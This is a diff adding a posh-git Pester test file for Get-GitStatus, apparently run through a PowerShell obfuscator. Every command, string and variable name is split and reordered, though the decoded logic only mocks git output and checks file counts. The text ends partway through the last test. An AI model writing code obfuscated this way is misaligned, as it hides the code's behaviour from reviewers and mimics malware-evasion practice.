@@ -1,0 +1,430 @@
+. ((("{1}{3}{4}{7}{5}{9}{0}{6}{2}{8}"-f'hare','{1}P','ps','SScri','pt','o','d.','Ro','1','t{0}S'))-F  [CHAR]92,[CHAR]36)
+
+&("{1}{0}" -f 'be','Descri') ("{4}{2}{0}{5}{3}{1}"-f 'us ','ts','-GitStat','s','Get','Te') {
+    &("{0}{2}{1}"-f 'Con','xt','te') ("{1}{6}{7}{2}{0}{4}{3}{5}"-f 'ing','Get-Gi','us Work','irectory',' D',' Tests','tSt','at') {
+        &("{2}{0}{1}"-f'o','reAll','Bef') {
+            &("{3}{0}{1}{2}"-f'-L','oc','ation','Set') ${pS`sc`RIPt`R`ooT}
+        }
+
+        &('It') ("{2}{1}{0}{5}{3}{6}{4}" -f'ect bran','corr','Returns the ','n','me','ch ','a') {
+            &("{0}{1}" -f'M','ock') -ModuleName ("{0}{1}"-f 'pos','h-git') ("{0}{1}"-f'gi','t') {
+                ${o`FS} = " "
+                if (${a`RGS} -contains ("{2}{1}{0}" -f 'arse','-p','rev')) {
+                    ${r`ES} = &("{0}{2}{3}{4}{1}" -f 'I','on','nvoke-Ex','pre','ssi') ("&$gitbin "+"$args")
+                    return ${R`eS}
+                }
+                &("{1}{2}{4}{5}{3}{0}" -f'nding','C','on','LineE','ve','rt-Native') @'
+
+'@
+            }
+
+            ${stat`Us} = &("{0}{3}{2}{1}"-f'Get-Gi','us','Stat','t')
+            &("{3}{4}{2}{1}{0}"-f'd','MockCalle','-','Asser','t') ("{1}{0}"-f 'it','g') -ModuleName ("{1}{0}{2}" -f 'sh-g','po','it') 
+            ${S`TAt`US}."bR`Anch" | &("{0}{1}"-f'Shou','ld') ('Be') ("{2}{0}{5}{4}{1}{3}"-f'ithil','tus-t','rke','ests','/more-sta','l')
+        }
+
+
+        &('It') ("{6}{3}{7}{5}{9}{4}{8}{0}{2}{1}"-f' working ','es','fil','or','d',' n','Returns the c','rect','ed untracked','umber of ad') {
+            &("{1}{0}"-f 'k','Moc') -ModuleName ("{1}{0}" -f'git','posh-') ("{1}{0}" -f't','gi') {
+                ${O`Fs} = " "
+                if (${A`RGs} -contains ("{0}{1}{2}" -f 'rev','-pa','rse')) {
+                    ${r`ES} = &("{1}{2}{0}{3}"-f'ke-E','I','nvo','xpression') ("&$gitbin "+"$args")
+                    return ${R`es}
+                }
+                &("{4}{2}{1}{0}{3}"-f'En','ne','ativeLi','ding','Convert-N') -SplitLines ((("{14}{5}{1}{13}{8}{12}{4}{6}{7}{3}{10}{11}{0}{9}{2}"-f 's','e','2x','? test/Ba','est',' t','s.','ps1
+?','t/','1
+P','r','.Tests.p','Foo.T','s','P2x
+
+??'))."r`ep`LACE"(([ChAR]80+[ChAR]50+[ChAR]120),[stRiNg][ChAR]39))
+            }
+
+            ${s`TaTus} = &("{3}{1}{0}{2}" -f '-Git','t','Status','Ge')
+            &("{2}{0}{4}{3}{1}"-f 'sert','led','As','kCal','-Moc') ("{1}{0}"-f 't','gi') -ModuleName ("{1}{0}" -f '-git','posh') 
+            ${ST`At`Us}."HA`s`iNDEX" | &("{1}{0}" -f 'hould','S') ('Be') ${F`AL`SE}
+            ${sTa`Tus}."hA`Su`Nt`RaCKed" | &("{0}{2}{1}" -f 'Sh','ld','ou') ('Be') ${T`RUE}
+            ${stA`Tus}."H`AS`wORKing" | &("{0}{1}"-f 'Sho','uld') ('Be') ${tr`Ue}
+            ${s`TaT`US}."woR`k`iNg"."A`Dded"."C`oUNT" | &("{1}{2}{0}" -f 'd','S','houl') ('Be') 2
+            ${s`T`ATUs}."WORK`ing"."DEL`e`Ted"."cOU`Nt" | &("{0}{2}{1}" -f 'S','uld','ho') ('Be') 0
+            ${sTat`Us}."W`oRkINg"."Mo`dIfi`ED"."C`oUNT" | &("{0}{1}" -f'Shou','ld') ('Be') 0
+            ${sta`TuS}."wo`Rk`inG"."UnmE`R`GeD"."co`UNt" | &("{1}{2}{0}"-f 'd','Sh','oul') ('Be') 0
+            ${s`TAT`Us}."wORK`Ing"."AD`DED"[0] | &("{0}{1}" -f'S','hould') ('Be') ("{2}{0}{4}{3}{1}"-f 'st/','1','te','ests.ps','Foo.T')
+            ${s`TAT`Us}."Wo`RkiNg"."a`dDed"[1] | &("{0}{1}" -f'Sh','ould') ('Be') ("{1}{2}{4}{3}{0}"-f's1','tes','t/Ba','.Tests.p','r')
+        }
+        &('It') ("{2}{1}{7}{3}{5}{0}{6}{4}{8}"-f'd','s th','Return','rect number of a','king fil','d','ed wor','e cor','es') {
+            &("{0}{1}" -f'Moc','k') -ModuleName ("{1}{2}{0}" -f 'it','p','osh-g') ("{0}{1}" -f'gi','t') {
+                ${O`FS} = " "
+                if (${Ar`Gs} -contains ("{2}{0}{1}"-f '-pa','rse','rev')) {
+                    ${r`es} = &("{3}{2}{0}{1}" -f 'E','xpression','voke-','In') ("&$gitbin "+"$args")
+                    return ${R`ES}
+                }
+                &("{0}{3}{2}{1}{4}"-f'Conver','neEnd','ativeLi','t-N','ing') -SplitLines ((("{9}{5}{10}{1}{3}{2}{11}{12}{14}{13}{0}{6}{4}{7}{8}"-f 'r','s','/Foo.','t','ests','0}
+
+ A ','.T','.ps1
+','{0}','{','te','T','ests.ps','st/Ba','1
+ A te'))  -F [char]39)
+            }
+
+            ${sTA`T`US} = &("{2}{1}{0}"-f 'us','t','Get-GitSta')
+            &("{1}{2}{0}{3}{4}"-f 'kCall','As','sert-Moc','e','d') ("{1}{0}"-f't','gi') -ModuleName ("{0}{1}{2}"-f'p','os','h-git') 
+            ${sTA`TUS}."hA`sin`dEx" | &("{2}{0}{1}" -f'ho','uld','S') ('Be') ${fa`lSe}
+            ${St`AtUS}."hAsUNTrAC`K`eD" | &("{1}{0}" -f 'hould','S') ('Be') ${T`RUe}
+            ${StAt`Us}."H`ASw`orKing" | &("{0}{1}" -f'S','hould') ('Be') ${TR`UE}
+            ${s`T`ATUS}."WOR`KInG"."add`ED"."COU`NT" | &("{0}{1}"-f 'Sho','uld') ('Be') 2
+            ${s`T`ATus}."Wor`kInG"."DeLe`TeD"."C`OuNT" | &("{0}{1}"-f'Sho','uld') ('Be') 0
+            ${S`Ta`TUs}."Wo`RK`InG"."m`OdI`FieD"."COU`NT" | &("{0}{1}"-f 'Shou','ld') ('Be') 0
+            ${s`TAT`US}."Wo`Rk`ING"."UN`MeRg`ED"."co`UnT" | &("{0}{2}{1}"-f'Sho','ld','u') ('Be') 0
+            ${sT`A`Tus}."wor`ki`NG"."aD`Ded"[0] | &("{2}{0}{1}"-f'oul','d','Sh') ('Be') ("{2}{3}{1}{0}"-f 'ps1','Tests.','test/Foo','.')
+            ${st`A`TUs}."wO`RkiNG"."A`dDED"[1] | &("{0}{1}"-f 'Sh','ould') ('Be') ("{0}{1}{3}{2}" -f 'te','st/Ba','s1','r.Tests.p')
+        }
+        &('It') ("{2}{4}{7}{0}{9}{10}{8}{1}{5}{6}{3}"-f 'ect','o','Returns th','leted working files','e','f',' de',' corr',' ',' nu','mber') {
+            &("{1}{0}" -f'k','Moc') -ModuleName ("{0}{1}{2}" -f 'p','osh','-git') ("{0}{1}" -f'g','it') {
+                ${O`Fs} = " "
+                if (${Ar`gs} -contains ("{1}{2}{3}{0}" -f '-parse','r','e','v')) {
+                    ${R`ES} = &("{3}{4}{0}{2}{1}" -f 'pres','n','sio','I','nvoke-Ex') ("&$gitbin "+"$args")
+                    return ${r`eS}
+                }
+                &("{3}{4}{2}{1}{0}" -f'ng','ndi','LineE','Conve','rt-Native') -SplitLines ((("{0}{6}{5}{1}{3}{7}{2}{10}{8}{4}{9}"-f 'J','/Foo.Tes','t/Ba','ts.ps1
+ D','1','t','Iy
+
+ D tes',' tes','.ps','
+JIy','r.Tests'))."r`E`PLace"('JIy',[strIng][cHar]39))
+            }
+
+            ${stAt`US} = &("{2}{3}{1}{4}{0}"-f 'us','S','Get-Gi','t','tat')
+            &("{2}{1}{3}{0}"-f 'd','ckCall','Assert-Mo','e') ("{0}{1}"-f 'g','it') -ModuleName ("{1}{0}"-f 'it','posh-g') 
+            ${St`ATUS}."hASi`NdEX" | &("{0}{2}{1}" -f 'Sh','d','oul') ('Be') ${fA`L`SE}
+            ${s`TAtUs}."Ha`s`UNtR`AckED" | &("{1}{2}{0}"-f'd','Sh','oul') ('Be') ${fAL`SE}
+            ${st`ATUs}."h`AS`wORKiNG" | &("{0}{1}" -f'Shou','ld') ('Be') ${tR`UE}
+            ${s`TaTuS}."wORk`InG"."adD`ed"."c`Ount" | &("{0}{1}" -f 'Shou','ld') ('Be') 0
+            ${STa`T`US}."W`oRKi`Ng"."De`L`eted"."C`OuNT" | &("{1}{0}" -f'hould','S') ('Be') 2
+            ${St`AtUs}."w`oRkI`NG"."M`odIFIeD"."CO`Unt" | &("{0}{1}"-f 'Shoul','d') ('Be') 0
+            ${sTA`TuS}."w`oR`kInG"."UN`m`eRged"."C`ounT" | &("{0}{2}{1}" -f'Sh','uld','o') ('Be') 0
+            ${StaT`Us}."wo`RKiNG"."de`LET`ED"[0] | &("{1}{2}{0}" -f'ld','S','hou') ('Be') ("{0}{2}{3}{1}" -f't','s.ps1','est','/Foo.Test')
+            ${S`TA`Tus}."wORkI`Ng"."dElEt`ed"[1] | &("{1}{0}" -f 'ould','Sh') ('Be') ("{2}{1}{3}{0}" -f'ar.Tests.ps1','e','t','st/B')
+        }
+        &('It') ("{9}{2}{5}{8}{3}{10}{0}{1}{7}{4}{6}" -f 'number of',' m','e','s the ','king fi','tur','les','odified wor','n','R','correct ') {
+            &("{0}{1}" -f'M','ock') -ModuleName ("{2}{1}{0}" -f'it','g','posh-') ("{1}{0}"-f 'it','g') {
+                ${o`Fs} = " "
+                if (${Ar`Gs} -contains ("{1}{0}{2}" -f 'ev','r','-parse')) {
+                    ${r`es} = &("{0}{4}{1}{2}{3}" -f 'Inv','ke-','Express','ion','o') ("&$gitbin "+"$args")
+                    return ${r`eS}
+                }
+                &("{5}{0}{7}{2}{1}{6}{3}{4}" -f'nv','tiv','Na','Line','Ending','Co','e','ert-') -SplitLines ((("{6}{1}{0}{8}{3}{7}{4}{2}{5}{9}" -f'sts.ps','Te','.T','
+ M ','t/Bar','ests.p','jz9
+
+ M test/Foo.','tes','1','s1
+jz9'))  -crePLAce ([chAr]106+[chAr]122+[chAr]57),[chAr]39)
+            }
+
+            ${St`ATus} = &("{1}{2}{0}{3}" -f 't','Get-Gi','tSta','us')
+            &("{1}{3}{2}{0}"-f'ed','Assert-','ockCall','M') ("{0}{1}" -f'g','it') -ModuleName ("{1}{0}"-f'osh-git','p') 
+            ${S`TA`Tus}."h`ASiND`eX" | &("{1}{0}" -f 'hould','S') ('Be') ${f`A`lSe}
+            ${St`ATus}."H`AsUn`T`RAckeD" | &("{2}{0}{1}" -f 'o','uld','Sh') ('Be') ${f`AL`SE}
+            ${s`T`ATus}."Ha`SWorK`ing" | &("{1}{0}"-f 'hould','S') ('Be') ${Tr`UE}
+            ${S`TATus}."W`oR`kINg"."adD`ED"."c`OunT" | &("{1}{2}{0}"-f 'd','Sh','oul') ('Be') 0
+            ${StAT`US}."WO`R`king"."D`eLETed"."co`Unt" | &("{1}{0}"-f 'd','Shoul') ('Be') 0
+            ${s`TA`TUs}."wO`RKInG"."ModIF`IeD"."c`oUnt" | &("{0}{1}"-f 'S','hould') ('Be') 2
+            ${sTA`TUS}."WO`RKI`NG"."u`Nme`RgEd"."co`UNT" | &("{2}{1}{0}"-f 'd','l','Shou') ('Be') 0
+            ${s`TAT`Us}."w`orkI`Ng"."modi`F`ied"[0] | &("{0}{1}"-f 'S','hould') ('Be') ("{1}{0}{4}{3}{2}"-f't/F','tes','s1','Tests.p','oo.')
+            ${ST`A`TuS}."worK`iNg"."M`oDifIeD"[1] | &("{0}{1}"-f'Shoul','d') ('Be') ("{0}{1}{2}{3}" -f'test','/Bar.','Tests.','ps1')
+        }
+        &('It') ("{8}{3}{0}{4}{9}{5}{6}{2}{7}{1}"-f 'rrec',' files',' work','he co','t','mer','ged','ing','Returns t',' number of un') {
+            &("{0}{1}" -f'Mo','ck') -ModuleName ("{1}{2}{0}" -f'it','po','sh-g') ("{0}{1}"-f'g','it') {
+                ${O`Fs} = " "
+                if (${a`RGS} -contains ("{0}{1}" -f 'rev','-parse')) {
+                    ${r`eS} = &("{4}{5}{1}{3}{0}{2}"-f'e-Ex','v','pression','ok','I','n') ("&$gitbin "+"$args")
+                    return ${R`eS}
+                }
+                &("{0}{3}{4}{2}{1}"-f 'Convert-Na','ng','di','tiveLi','neEn') -SplitLines ((("{1}{4}{5}{3}{8}{6}{7}{2}{0}" -f'{0}','{0','est/Bar.Tests.ps1
+','/Fo','}
+
+ U ','test','sts.ps1
+ ','U t','o.Te'))  -f  [ChAr]39)
+            }
+
+            ${S`TaTuS} = &("{2}{1}{0}" -f'us','at','Get-GitSt')
+            &("{1}{3}{0}{4}{2}" -f 'rt-MockCall','As','d','se','e') ("{1}{0}" -f 't','gi') -ModuleName ("{1}{0}"-f'-git','posh') 
+            ${sTa`T`US}."ha`SiN`dEx" | &("{2}{1}{0}"-f'd','oul','Sh') ('Be') ${fAL`sE}
+            ${STa`TUS}."H`A`Sunt`RACKED" | &("{2}{0}{1}"-f'ul','d','Sho') ('Be') ${fA`lse}
+            ${STa`T`US}."HaSw`orK`INg" | &("{1}{0}"-f 'd','Shoul') ('Be') ${t`RUE}
+            ${STAT`US}."wO`RkING"."aDd`ed"."CoU`NT" | &("{1}{0}{2}" -f'oul','Sh','d') ('Be') 0
+            ${s`TATuS}."Wo`RK`ING"."d`ElET`ed"."c`Ount" | &("{1}{0}"-f 'uld','Sho') ('Be') 0
+            ${st`AtUS}."woRK`INg"."mOD`I`FIEd"."CO`Unt" | &("{1}{0}" -f'ould','Sh') ('Be') 0
+            ${s`Tat`US}."w`oRk`iNG"."Un`mErG`Ed"."CoU`Nt" | &("{0}{1}{2}"-f 'S','h','ould') ('Be') 2
+            ${st`A`TUs}."WOR`kiNg"."Unm`eR`gED"[0] | &("{0}{2}{1}" -f'Sh','uld','o') ('Be') ("{4}{3}{0}{1}{2}"-f 'Foo.Tests.','ps','1','st/','te')
+            ${stA`TUs}."WOr`KiNg"."U`NME`Rged"[1] | &("{1}{0}" -f'd','Shoul') ('Be') ("{4}{1}{0}{3}{2}" -f 'ts.','st/Bar.Tes','1','ps','te')
+        }
+        &('It') ("{2}{6}{1}{5}{10}{4}{7}{11}{9}{12}{0}{8}{3}"-f'xed w','urn','R','es','cor','s the','et','re','orking fil','number ',' ','ct ','of mi') {
+            &("{0}{1}"-f 'Mo','ck') -ModuleName ("{0}{1}{2}"-f 'posh','-g','it') ("{0}{1}"-f'gi','t') {
+                ${o`FS} = " "
+                if (${AR`GS} -contains ("{1}{0}" -f'parse','rev-')) {
+                    ${r`ES} = &("{2}{1}{3}{5}{4}{0}"-f'ion','e','Invok','-','press','Ex') ("&$gitbin "+"$args")
+                    return ${R`es}
+                }
+                &("{0}{3}{4}{2}{1}" -f'Conver','ng','Endi','t-NativeLin','e') -SplitLines ((("{4}{23}{13}{14}{6}{15}{27}{9}{22}{20}{0}{2}{8}{10}{24}{19}{7}{12}{17}{29}{21}{5}{11}{1}{25}{26}{16}{3}{18}{28}" -f 'ed.','te','T','ged.Tests','{0}','.ps','racked.Tests.','s1
+','e',' te','sts.ps1
+ D tes','1
+ U ',' M test/Modi','st/U','nt','ps','mer','f','.ps1','.p','d','.Tests','st/Ad','
+
+ ? te','t/Deleted.Tests','st/','Un','1
+ A','
+{0}','ied'))  -F[cHaR]39)
+            }
+
+            ${ST`ATUs} = &("{1}{3}{2}{0}"-f'atus','G','St','et-Git')
+            &("{1}{5}{4}{2}{0}{3}"-f'l','Asse','a','led','-MockC','rt') ("{1}{0}"-f 'it','g') -ModuleName ("{1}{2}{0}"-f't','posh','-gi') 
+            ${St`A`TUs}."Has`In`DeX" | &("{0}{1}"-f 'Shoul','d') ('Be') ${fA`Lse}
+            ${ST`AtUs}."HASuN`TRaC`keD" | &("{0}{1}"-f 'Shoul','d') ('Be') ${Tr`Ue}
+            ${s`TaT`Us}."has`WORKI`Ng" | &("{0}{1}"-f 'Sho','uld') ('Be') ${TR`Ue}
+            ${S`TaTus}."wOr`k`iNG"."a`dDED"."cOU`NT" | &("{0}{1}" -f 'Sh','ould') ('Be') 2
+            ${St`AtUs}."worKi`NG"."D`eLeTEd"."C`ouNt" | &("{1}{0}"-f'hould','S') ('Be') 1
+            ${S`TA`TUs}."w`ORki`Ng"."mO`Dified"."cOu`Nt" | &("{1}{0}"-f 'uld','Sho') ('Be') 1
+            ${sTaT`US}."W`ORK`ING"."unm`E`RGEd"."COU`Nt" | &("{0}{1}"-f'Sho','uld') ('Be') 1
+            ${sta`TUS}."Wo`RK`ING"."add`ED"[0] | &("{1}{0}" -f'uld','Sho') ('Be') ("{1}{0}{4}{5}{2}{3}" -f'Unt','test/','ked.','Tests.ps1','ra','c')
+            ${St`AT`US}."WoRk`i`NG"."A`DdEd"[1] | &("{1}{0}"-f'ld','Shou') ('Be') ("{4}{1}{3}{2}{0}" -f'.ps1','st/Added','Tests','.','te')
+            ${stAT`Us}."W`oR`KinG"."deL`et`ed"[0] | &("{2}{0}{1}"-f'ou','ld','Sh') ('Be') ("{5}{1}{3}{0}{2}{4}"-f'p','d.Tests','s','.','1','test/Delete')
+            ${stA`T`US}."WO`RkI`Ng"."MO`d`ifiEd"[0] | &("{0}{1}" -f'Shou','ld') ('Be') ("{3}{2}{1}{0}{4}{5}"-f'ied.T','f','i','test/Mod','e','sts.ps1')
+            ${S`T`AtUS}."WOR`KING"."uNm`e`RgED"[0] | &("{0}{1}"-f 'Sh','ould') ('Be') ("{3}{4}{2}{0}{1}{6}{5}"-f'm','erg','n','test','/U','ests.ps1','ed.T')
+        }
+
+        &('It') ("{2}{5}{0}{4}{1}{7}{9}{10}{3}{6}{8}" -f 'rns ','h','R','dded ','t','etu','ind','e correct ','ex files','num','ber of a') {
+            &("{1}{0}" -f'ck','Mo') -ModuleName ("{2}{1}{0}"-f'it','g','posh-') ("{0}{1}"-f 'gi','t') {
+                ${o`FS} = " "
+                if (${AR`GS} -contains ("{1}{2}{0}"-f'e','rev-','pars')) {
+                    ${r`eS} = &("{1}{3}{2}{0}" -f 'ssion','Invoke','re','-Exp') ("&$gitbin "+"$args")
+                    return ${R`Es}
+                }
+                &("{3}{0}{4}{2}{1}"-f'nvert-N','Ending','iveLine','Co','at') -SplitLines ((("{6}{1}{7}{5}{12}{4}{3}{9}{11}{10}{8}{2}{0}"-f's.ps1
+{0}','}
+
+A ','st','ps1
+A  ','.Tests.','e','{0',' t','Te','test/','.','Bar','st/Foo'))  -F  [cHaR]39)
+            }
+
+            ${st`AtUs} = &("{3}{1}{0}{2}"-f'itStat','-G','us','Get')
+            &("{4}{2}{3}{1}{0}{5}" -f'Calle','k','ssert-','Moc','A','d') ("{1}{0}" -f'it','g') -ModuleName ("{1}{2}{0}"-f 't','p','osh-gi') 
+            ${sTA`TUS}."h`A`sIndeX" | &("{0}{1}"-f 'Shoul','d') ('Be') ${tr`Ue}
+            ${s`TaTuS}."hAsu`N`TR`AcKED" | &("{1}{0}"-f'uld','Sho') ('Be') ${fAL`se}
+            ${S`T`ATuS}."H`ASwOr`KinG" | &("{0}{1}"-f'S','hould') ('Be') ${F`ALsE}
+            ${sTA`TuS}."In`dex"."add`ed"."C`OuNt" | &("{0}{1}" -f 'Sh','ould') ('Be') 2
+            ${St`A`TUs}."iN`DEx"."DeLE`TEd"."C`OUNt" | &("{0}{1}"-f 'Shoul','d') ('Be') 0
+            ${S`T`ATuS}."I`NdEx"."Mo`D`IFied"."c`OUnT" | &("{0}{1}" -f 'Shoul','d') ('Be') 0
+            ${STa`T`Us}."I`NdeX"."U`NMErGEd"."COU`NT" | &("{1}{0}"-f 'ld','Shou') ('Be') 0
+            ${st`At`US}."i`NDex"."ad`DED"[0] | &("{2}{0}{1}" -f'ou','ld','Sh') ('Be') ("{2}{1}{3}{0}{4}" -f's','est/Foo.Tests.','t','p','1')
+            ${sTat`Us}."IN`dex"."ADD`eD"[1] | &("{0}{1}"-f'Sh','ould') ('Be') ("{0}{2}{4}{1}{3}" -f 'test/Bar','ests','.','.ps1','T')
+        }
+        &('It') ("{10}{2}{8}{9}{0}{7}{6}{1}{4}{3}{5}"-f 'um','deleted ','eturns th','ndex fi','i','les','er of ','b','e co','rrect n','R') {
+            &("{0}{1}"-f'Moc','k') -ModuleName ("{1}{0}{2}" -f'h-gi','pos','t') ("{1}{0}"-f't','gi') {
+                ${o`FS} = " "
+                if (${ar`Gs} -contains ("{1}{2}{0}"-f 'arse','rev-','p')) {
+                    ${R`eS} = &("{2}{3}{0}{1}"-f'o','n','Invoke-Expr','essi') ("&$gitbin "+"$args")
+                    return ${R`ES}
+                }
+                &("{6}{2}{4}{3}{5}{0}{1}"-f 'eE','nding','vert','veLi','-Nati','n','Con') -SplitLines ((("{13}{8}{3}{0}{7}{4}{14}{11}{6}{9}{2}{1}{12}{5}{10}" -f ' ','st/Bar.T','D  te','
+
+D','Fo','sts.ps1
+','ps1',' test/','H','
+','zyH','s.','e','zy','o.Test'))."REplA`CE"('zyH',[striNG][cHAR]39))
+            }
+
+            ${sT`AT`Us} = &("{0}{3}{2}{1}"-f 'Get-','s','u','GitStat')
+            &("{2}{1}{3}{0}{4}"-f'c','ert-M','Ass','o','kCalled') ("{1}{0}"-f't','gi') -ModuleName ("{2}{0}{1}"-f 'h-gi','t','pos') 
+            ${ST`A`TuS}."HasI`NdeX" | &("{1}{2}{0}"-f 'd','S','houl') ('Be') ${T`RUe}
+            ${StA`Tus}."H`ASUntR`ACk`ed" | &("{2}{0}{1}" -f'ho','uld','S') ('Be') ${FA`lSe}
+            ${S`TA`TUs}."Has`wORk`inG" | &("{1}{0}"-f'ould','Sh') ('Be') ${F`AlSe}
+            ${stA`T`Us}."i`NDEX"."adD`ED"."COu`NT" | &("{1}{0}{2}" -f 'ho','S','uld') ('Be') 0
+            ${stAT`US}."IN`DEx"."DElE`T`ED"."c`ouNt" | &("{0}{1}{2}" -f 'S','hou','ld') ('Be') 2
+            ${stA`T`US}."iN`dex"."MOdiF`iEd"."CO`UnT" | &("{0}{1}" -f 'Sh','ould') ('Be') 0
+            ${s`TA`TUS}."I`NDEx"."U`NMeR`GEd"."CO`UNT" | &("{0}{1}"-f 'S','hould') ('Be') 0
+            ${s`T`AtuS}."In`DEx"."d`eLEtEd"[0] | &("{0}{1}"-f'Sh','ould') ('Be') ("{4}{0}{3}{2}{1}{5}"-f'/F','.Tests.p','o','o','test','s1')
+            ${sT`A`TuS}."INd`EX"."D`Ele`TeD"[1] | &("{2}{0}{1}" -f'houl','d','S') ('Be') ("{4}{5}{2}{1}{3}{0}"-f '1','s','Te','ts.ps','test/B','ar.')
+        }
+        &('It') ("{9}{12}{4}{13}{11}{0}{1}{8}{10}{3}{2}{5}{7}{6}"-f 'r','ec','r of co','mbe','th','pie',' files','d index','t','Return',' nu',' cor','s ','e') {
+            &("{0}{1}" -f 'M','ock') -ModuleName ("{2}{0}{1}"-f 's','h-git','po') ("{1}{0}"-f 't','gi') {
+                ${O`Fs} = " "
+                if (${A`Rgs} -contains ("{0}{2}{1}"-f'rev','arse','-p')) {
+                    ${R`ES} = &("{2}{3}{1}{0}"-f 'ession','r','Invok','e-Exp') ("&$gitbin "+"$args")
+                    return ${r`eS}
+                }
+                &("{6}{4}{5}{3}{1}{0}{2}"-f 'neE','i','nding','tiveL','onvert-','Na','C') -SplitLines ((("{2}{6}{8}{7}{1}{5}{4}{3}{9}{0}" -f'f6','oo','gf6','ar.Tests.ps1','1
+C  test/B','.Tests.ps','
+
+','test/F','C  ','
+g'))."re`PLaCe"(([CHar]103+[CHar]102+[CHar]54),[STRing][CHar]39))
+            }
+
+            ${s`TatUs} = &("{4}{3}{2}{0}{1}"-f 't','atus','itS','t-G','Ge')
+            &("{4}{1}{0}{2}{3}" -f'-Moc','rt','kC','alled','Asse') ("{0}{1}"-f 'g','it') -ModuleName ("{0}{1}" -f 'posh-g','it') 
+            ${sTAT`Us}."HasI`NdEx" | &("{0}{1}"-f'S','hould') ('Be') ${Tr`Ue}
+            ${Sta`T`Us}."h`ASunt`RACk`ED" | &("{2}{0}{1}"-f 'ou','ld','Sh') ('Be') ${F`ALse}
+            ${sTA`TuS}."H`A`SwORkING" | &("{0}{1}"-f'S','hould') ('Be') ${f`ALse}
+            ${sTa`T`US}."inD`eX"."A`DdeD"."CO`Unt" | &("{0}{2}{1}" -f'Sho','ld','u') ('Be') 0
+            ${S`TA`TuS}."IND`EX"."d`EleT`Ed"."C`oUNt" | &("{0}{1}" -f'Shoul','d') ('Be') 0
+            ${stA`TUs}."Ind`EX"."MODIF`i`Ed"."C`OUNt" | &("{0}{1}{2}" -f 'Shou','l','d') ('Be') 2
+            ${Stat`US}."i`NDEx"."UN`mergED"."Co`UnT" | &("{1}{0}"-f'hould','S') ('Be') 0
+            ${s`TA`TUS}."ind`Ex"."M`Od`ifIEd"[0] | &("{1}{0}" -f'ld','Shou') ('Be') ("{1}{4}{0}{3}{5}{2}" -f'/Fo','te','s1','o','st','.Tests.p')
+            ${s`TATUs}."Ind`Ex"."MoD`IF`iEd"[1] | &("{0}{1}" -f 'Shou','ld') ('Be') ("{2}{0}{3}{1}{4}"-f 'st/B','ps','te','ar.Tests.','1')
+        }
+        &('It') ("{0}{4}{2}{5}{7}{1}{10}{8}{12}{3}{9}{11}{6}"-f 'Return',' number',' the cor','i','s','rec','les','t',' m','fied',' of',' index fi','od') {
+            &("{1}{0}"-f'ck','Mo') -ModuleName ("{0}{1}"-f'posh-','git') ("{0}{1}" -f'gi','t') {
+                ${o`FS} = " "
+                if (${a`RGS} -contains ("{1}{2}{0}{3}"-f 'pa','r','ev-','rse')) {
+                    ${R`ES} = &("{3}{2}{1}{0}{4}" -f 'x','e-E','vok','In','pression') ("&$gitbin "+"$args")
+                    return ${r`Es}
+                }
+                &("{5}{7}{4}{6}{1}{0}{3}{2}" -f'e','Lin','nding','E','ert-Nati','C','ve','onv') -SplitLines ((("{0}{1}{5}{9}{2}{3}{12}{8}{7}{4}{11}{10}{6}{13}" -f '{0}
+
+','M  t','/Foo','.T','1
+M','es','ar.Tests.ps1
+','s.ps','t','t',' test/B',' ','es','{0}'))-F  [ChAR]39)
+            }
+
+            ${sTAT`US} = &("{2}{1}{0}" -f 'tatus','t-GitS','Ge')
+            &("{3}{0}{2}{4}{1}" -f'er','d','t-Moc','Ass','kCalle') ("{0}{1}" -f'gi','t') -ModuleName ("{0}{1}"-f'po','sh-git') 
+            ${S`T`ATUs}."H`AS`Index" | &("{1}{0}" -f'hould','S') ('Be') ${t`RUe}
+            ${sTa`TUS}."Ha`sUNTr`Ack`ed" | &("{0}{1}" -f 'S','hould') ('Be') ${FaL`se}
+            ${S`Ta`TUS}."HAsWOrk`i`Ng" | &("{0}{1}{2}" -f 'S','houl','d') ('Be') ${fa`l`sE}
+            ${StA`T`Us}."i`NDeX"."AdD`eD"."Co`Unt" | &("{1}{0}" -f 'uld','Sho') ('Be') 0
+            ${sT`AT`US}."i`NDeX"."dEl`ETED"."CoU`Nt" | &("{1}{0}"-f'ould','Sh') ('Be') 0
+            ${sT`At`Us}."I`NDex"."m`o`DiFied"."C`Ount" | &("{1}{0}" -f'ould','Sh') ('Be') 2
+            ${STA`T`Us}."iN`dex"."UNM`eR`gEd"."cOU`NT" | &("{0}{1}{2}" -f'Sho','ul','d') ('Be') 0
+            ${sT`At`Us}."i`NDeX"."MOdi`F`iED"[0] | &("{0}{1}"-f 'S','hould') ('Be') ("{0}{4}{3}{2}{5}{1}"-f'test/F','.ps1','.Test','o','o','s')
+            ${s`T`Atus}."iNd`EX"."mOdIF`ieD"[1] | &("{1}{0}"-f'uld','Sho') ('Be') ("{1}{4}{3}{0}{2}" -f 'Tes','t','ts.ps1','/Bar.','est')
+        }
+        &('It') ("{0}{4}{6}{8}{10}{1}{5}{7}{3}{9}{2}" -f 'Ret','il','e','for a','urns the corre','es','ct',' ',' numb',' renam','er of modified index f') {
+            &("{0}{1}"-f 'Moc','k') -ModuleName ("{0}{2}{1}"-f 'p','-git','osh') ("{1}{0}" -f'it','g') {
+                ${O`Fs} = " "
+                if (${ar`Gs} -contains ("{0}{1}{2}" -f'rev','-','parse')) {
+                    ${R`ES} = &("{0}{5}{3}{4}{1}{2}"-f'In','o','n','ke-Ex','pressi','vo') ("&$gitbin "+"$args")
+                    return ${R`ES}
+                }
+                &("{4}{0}{2}{1}{3}{6}{5}" -f 'vert','ativeLi','-N','n','Con','g','eEndin') -SplitLines ((("{7}{5}{1}{4}{0}{6}{2}{3}"-f'DME2','E.md','0','}',' -> REA','ADM','.md
+{','{0}
+
+R  RE'))-F  [chAR]39)
+            }
+
+            ${stA`TUS} = &("{1}{3}{2}{0}" -f's','Get','atu','-GitSt')
+            &("{1}{3}{0}{4}{5}{2}"-f 'rt-Mo','As','ed','se','ckCa','ll') ("{1}{0}"-f'it','g') -ModuleName ("{1}{2}{0}" -f 'git','posh','-') 
+            ${st`A`TUS}."H`Asin`DEx" | &("{1}{0}"-f'uld','Sho') ('Be') ${T`Rue}
+            ${st`AtUs}."has`UNtR`ACKed" | &("{0}{1}{2}"-f'S','houl','d') ('Be') ${fA`L`SE}
+            ${staT`US}."hAsWo`RkI`NG" | &("{1}{0}" -f 'ould','Sh') ('Be') ${f`Al`SE}
+            ${s`Ta`Tus}."i`NdEX"."aD`ded"."cO`UNt" | &("{0}{1}"-f 'Shou','ld') ('Be') 0
